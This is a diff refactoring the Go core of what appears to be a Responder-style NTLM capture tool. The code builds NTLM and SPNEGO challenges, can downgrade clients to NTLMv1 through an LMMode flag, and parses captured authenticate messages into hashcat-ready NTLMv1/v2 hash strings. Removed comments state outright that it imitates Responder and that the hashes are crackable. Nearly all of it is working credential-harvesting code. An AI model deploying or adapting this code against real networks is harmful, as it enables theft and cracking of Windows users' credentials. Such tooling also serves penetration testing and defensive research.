@@ -1,4 +1,4 @@
-package main
+package core
 
 import (
 	"bytes"
@@ -10,9 +10,8 @@ import (
 	"unicode/utf16"
 )
 
-const ntlmSSPSig = "NTLMSSP\x00"
+const NTLMSSPSig = "NTLMSSP\x00"
 
-// NTLMv2 challenge flags (default — modern clients use NTLMv2)
 const challengeFlags = uint32(
 	0x00000001 | // UNICODE
 		0x00000002 | // OEM
@@ -28,8 +27,6 @@ const challengeFlags = uint32(
 		0x40000000 | // KEY_EXCH
 		0x80000000) // 56
 
-// NTLMv1 downgrade flags — remove EXTENDED_SESSIONSECURITY so client falls back to NTLMv1.
-// Resulting hashes are crackable with hashcat -m 5500 (NTLMv1) or -m 5600 (NTLMv2).
 const challengeFlagsLM = uint32(
 	0x00000001 | // UNICODE
 		0x00000002 | // OEM
@@ -43,9 +40,15 @@ const challengeFlagsLM = uint32(
 		0x40000000 | // KEY_EXCH
 		0x80000000) // 56
 
-// ---------- UTF-16 helpers ----------
+// NTLMMsgType returns the NTLM message type (1, 2, or 3).
+func NTLMMsgType(ntlm []byte) uint32 {
+	if len(ntlm) < 12 {
+		return 0
+	}
+	return uint32(ntlm[8]) | uint32(ntlm[9])<<8 | uint32(ntlm[10])<<16 | uint32(ntlm[11])<<24
+}
 
-func encodeUTF16LE(s string) []byte {
+func EncodeUTF16LE(s string) []byte {
 	var b bytes.Buffer
 	for _, r := range s {
 		if r <= 0xFFFF {
@@ -57,7 +60,7 @@ func encodeUTF16LE(s string) []byte {
 	return b.Bytes()
 }
 
-func decodeUTF16LE(b []byte) string {
+func DecodeUTF16LE(b []byte) string {
 	if len(b) == 0 {
 		return ""
 	}
@@ -69,8 +72,6 @@ func decodeUTF16LE(b []byte) string {
 	return string(utf16.Decode(u16))
 }
 
-// ---------- NTLM challenge building ----------
-
 func buildTargetInfo(domain, computer string) []byte {
 	var b bytes.Buffer
 	avp := func(id uint16, val []byte) {
@@ -78,62 +79,53 @@ func buildTargetInfo(domain, computer string) []byte {
 		binary.Write(&b, binary.LittleEndian, uint16(len(val)))
 		b.Write(val)
 	}
-	avp(0x0002, encodeUTF16LE(domain))
-	avp(0x0001, encodeUTF16LE(computer))
-	avp(0x0004, encodeUTF16LE(strings.ToLower(domain)))
-	avp(0x0003, encodeUTF16LE(strings.ToLower(computer)+"."+strings.ToLower(domain)))
-	// MsvAvTimestamp
+	avp(0x0002, EncodeUTF16LE(domain))
+	avp(0x0001, EncodeUTF16LE(computer))
+	avp(0x0004, EncodeUTF16LE(strings.ToLower(domain)))
+	avp(0x0003, EncodeUTF16LE(strings.ToLower(computer)+"."+strings.ToLower(domain)))
 	epoch := time.Date(1601, 1, 1, 0, 0, 0, 0, time.UTC)
 	ft := uint64(time.Since(epoch).Nanoseconds() / 100)
 	ftb := make([]byte, 8)
 	binary.LittleEndian.PutUint64(ftb, ft)
 	avp(0x0007, ftb)
-	avp(0x0000, nil) // EOL
+	avp(0x0000, nil)
 	return b.Bytes()
 }
 
-// NewChallenge returns the global session challenge (fixed per run, like real Responder).
-func NewChallenge() [8]byte { return globalChallenge }
-
 func BuildNTLMChallenge(challenge [8]byte, domain, computer string) []byte {
 	flags := challengeFlags
-	if lmMode {
+	if LMMode {
 		flags = challengeFlagsLM
 	}
-
-	targetName := encodeUTF16LE(domain)
+	targetName := EncodeUTF16LE(domain)
 	targetInfo := buildTargetInfo(domain, computer)
-
-	const hdrSize = 56 // fixed header before payload
+	const hdrSize = 56
 	tnOffset := uint32(hdrSize)
 	tiOffset := tnOffset + uint32(len(targetName))
 
 	var b bytes.Buffer
-	b.WriteString(ntlmSSPSig)
+	b.WriteString(NTLMSSPSig)
 	binary.Write(&b, binary.LittleEndian, uint32(2))
 	binary.Write(&b, binary.LittleEndian, uint16(len(targetName)))
 	binary.Write(&b, binary.LittleEndian, uint16(len(targetName)))
 	binary.Write(&b, binary.LittleEndian, tnOffset)
 	binary.Write(&b, binary.LittleEndian, flags)
 	b.Write(challenge[:])
-	binary.Write(&b, binary.LittleEndian, uint64(0)) // reserved
+	binary.Write(&b, binary.LittleEndian, uint64(0))
 	binary.Write(&b, binary.LittleEndian, uint16(len(targetInfo)))
 	binary.Write(&b, binary.LittleEndian, uint16(len(targetInfo)))
 	binary.Write(&b, binary.LittleEndian, tiOffset)
-	b.Write([]byte{0x06, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0F}) // version
+	b.Write([]byte{0x06, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0F})
 	b.Write(targetName)
 	b.Write(targetInfo)
 	return b.Bytes()
 }
 
-// ---------- NTLM authenticate parsing ----------
-
 // ParseNTLMAuthenticate parses a Type3 NTLM message and returns the hash string.
-// Auto-detects NTLMv1 (NtResponse = 24 bytes) vs NTLMv2 (NtResponse > 24 bytes).
 // NTLMv2 format: USER::DOMAIN:CHALLENGE:NTProofStr:blob  (hashcat -m 5600)
 // NTLMv1 format: USER::DOMAIN:LMResp:NTResp:CHALLENGE    (hashcat -m 5500)
 func ParseNTLMAuthenticate(data []byte, challenge [8]byte) (hash, username, domain string, err error) {
-	if len(data) < 12 || !strings.HasPrefix(string(data), ntlmSSPSig) {
+	if len(data) < 12 || !strings.HasPrefix(string(data), NTLMSSPSig) {
 		return "", "", "", fmt.Errorf("not NTLMSSP")
 	}
 	if binary.LittleEndian.Uint32(data[8:12]) != 3 {
@@ -142,7 +134,6 @@ func ParseNTLMAuthenticate(data []byte, challenge [8]byte) (hash, username, doma
 	if len(data) < 52 {
 		return "", "", "", fmt.Errorf("too short")
 	}
-
 	field := func(off int) []byte {
 		if off+8 > len(data) {
 			return nil
@@ -154,49 +145,39 @@ func ParseNTLMAuthenticate(data []byte, challenge [8]byte) (hash, username, doma
 		}
 		return data[foff : foff+uint32(flen)]
 	}
-
-	lmData := field(12) // LmChallengeResponse
-	ntData := field(20) // NtChallengeResponse
-	username = decodeUTF16LE(field(36))
-	domain = decodeUTF16LE(field(28))
+	lmData := field(12)
+	ntData := field(20)
+	username = DecodeUTF16LE(field(36))
+	domain = DecodeUTF16LE(field(28))
 
 	if len(ntData) == 24 {
-		// NTLMv1: LmResp(24) + NtResp(24) + challenge(8) — hashcat -m 5500
-		lmHex := hex.EncodeToString(lmData)
-		ntHex := hex.EncodeToString(ntData)
 		hash = fmt.Sprintf("%s::%s:%s:%s:%s",
 			username, domain,
-			lmHex, ntHex,
-			hex.EncodeToString(challenge[:]),
-		)
+			hex.EncodeToString(lmData),
+			hex.EncodeToString(ntData),
+			hex.EncodeToString(challenge[:]))
 	} else {
-		// NTLMv2: hashcat -m 5600
 		if len(ntData) < 16 {
 			return "", "", "", fmt.Errorf("NtChallengeResponse too short")
 		}
-		ntProofStr := ntData[:16]
-		blob := ntData[16:]
 		hash = fmt.Sprintf("%s::%s:%s:%s:%s",
 			username, domain,
 			hex.EncodeToString(challenge[:]),
-			hex.EncodeToString(ntProofStr),
-			hex.EncodeToString(blob),
-		)
+			hex.EncodeToString(ntData[:16]),
+			hex.EncodeToString(ntData[16:]))
 	}
 	return hash, username, domain, nil
 }
 
-// ParseNTLMNegotiate extracts workstation and domain names + OS version from a Type1 message.
-// Returns empty strings if fields are absent (older clients omit them).
+// ParseNTLMNegotiate extracts workstation, domain, and OS version from a Type1 message.
 func ParseNTLMNegotiate(data []byte) (workstation, dom, osVer string) {
-	if len(data) < 32 || !strings.HasPrefix(string(data), ntlmSSPSig) {
+	if len(data) < 32 || !strings.HasPrefix(string(data), NTLMSSPSig) {
 		return
 	}
 	if binary.LittleEndian.Uint32(data[8:12]) != 1 {
 		return
 	}
 	flags := binary.LittleEndian.Uint32(data[12:16])
-
 	field := func(off int) []byte {
 		if off+8 > len(data) {
 			return nil
@@ -208,39 +189,33 @@ func ParseNTLMNegotiate(data []byte) (workstation, dom, osVer string) {
 		}
 		return data[foff : foff+uint32(flen)]
 	}
-
-	// DomainNameFields at offset 16, WorkstationFields at offset 24
-	if flags&0x00001000 != 0 { // DOMAIN_SUPPLIED
+	if flags&0x00001000 != 0 {
 		dom = string(field(16))
 	}
-	if flags&0x00002000 != 0 { // WORKSTATION_SUPPLIED
+	if flags&0x00002000 != 0 {
 		workstation = string(field(24))
 	}
-
-	// Version field at offset 32 (present if flag 0x02000000 is set)
 	if flags&0x02000000 != 0 && len(data) >= 40 {
-		maj := data[32]
-		min := data[33]
-		build := binary.LittleEndian.Uint16(data[34:36])
-		osVer = fmt.Sprintf("Windows %d.%d build %d", maj, min, build)
+		osVer = fmt.Sprintf("Windows %d.%d build %d", data[32], data[33],
+			binary.LittleEndian.Uint16(data[34:36]))
 	}
 	return
 }
 
 func FindNTLMSSP(buf []byte) []byte {
-	idx := bytes.Index(buf, []byte(ntlmSSPSig))
+	idx := bytes.Index(buf, []byte(NTLMSSPSig))
 	if idx < 0 {
 		return nil
 	}
 	return buf[idx:]
 }
 
-// ---------- ASN.1 DER helpers ----------
+// ---------- ASN.1 DER / SPNEGO helpers ----------
 
 var ntlmsspOID = []byte{0x06, 0x0a, 0x2b, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x02, 0x0a}
 var spnegoOID = []byte{0x06, 0x06, 0x2b, 0x06, 0x01, 0x05, 0x05, 0x02}
 
-func derLen(n int) []byte {
+func DerLen(n int) []byte {
 	switch {
 	case n < 0x80:
 		return []byte{byte(n)}
@@ -251,30 +226,26 @@ func derLen(n int) []byte {
 	}
 }
 
-func derTag(tag byte, data []byte) []byte {
+func DerTag(tag byte, data []byte) []byte {
 	out := []byte{tag}
-	out = append(out, derLen(len(data))...)
+	out = append(out, DerLen(len(data))...)
 	return append(out, data...)
 }
 
-// BuildSPNEGONegotiateToken builds the SPNEGO NegTokenInit for the SMB2 NEGOTIATE response.
-// It declares we support NTLMSSP only.
 func BuildSPNEGONegotiateToken() []byte {
-	mechTypeList := derTag(0x30, ntlmsspOID) // SEQUENCE OF OID
-	mechTypes := derTag(0xa0, mechTypeList)   // [0] mechTypes
-	innerSeq := derTag(0x30, mechTypes)
-	negTokenInit := derTag(0xa0, innerSeq)
+	mechTypeList := DerTag(0x30, ntlmsspOID)
+	mechTypes := DerTag(0xa0, mechTypeList)
+	innerSeq := DerTag(0x30, mechTypes)
+	negTokenInit := DerTag(0xa0, innerSeq)
 	content := append(spnegoOID, negTokenInit...)
-	return derTag(0x60, content) // APPLICATION 0
+	return DerTag(0x60, content)
 }
 
-// WrapSPNEGOChallenge wraps NTLMSSP_CHALLENGE in a SPNEGO NegTokenResp (accept-incomplete).
 func WrapSPNEGOChallenge(ntlmChallenge []byte) []byte {
-	negState := derTag(0xa0, []byte{0x0a, 0x01, 0x01})     // accept-incomplete
-	supportedMech := derTag(0xa1, ntlmsspOID)               // [1] supportedMech
-	responseToken := derTag(0xa2, derTag(0x04, ntlmChallenge)) // [2] responseToken = OCTET STRING
-
+	negState := DerTag(0xa0, []byte{0x0a, 0x01, 0x01})
+	supportedMech := DerTag(0xa1, ntlmsspOID)
+	responseToken := DerTag(0xa2, DerTag(0x04, ntlmChallenge))
 	inner := append(negState, supportedMech...)
 	inner = append(inner, responseToken...)
-	return derTag(0xa1, derTag(0x30, inner))
+	return DerTag(0xa1, DerTag(0x30, inner))
 }
